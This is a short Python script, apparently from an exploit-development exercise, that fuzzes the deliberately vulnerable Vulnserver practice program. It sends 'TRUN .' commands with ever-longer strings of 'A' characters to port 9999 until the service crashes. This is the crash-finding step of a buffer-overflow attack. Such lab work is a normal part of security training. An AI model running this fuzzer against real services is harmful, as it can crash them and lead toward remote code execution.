
import socket,sys


class Vulnserver:

    def conexao(self, ip):
        try:
            quantidade = 1
            while quantidade > 0:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 9999))
                buff = 'A' * (quantidade-1)
                print("tamanho ",  (quantidade-1))
                overflow = 'TRUN .' +  buff
                s.send(overflow.encode())
                resposta = s.recvfrom(20)
                #   time.sleep(1)
                quantidade +=50
        except:
            print(resposta)


Vulnserver().conexao(sys.argv[1])

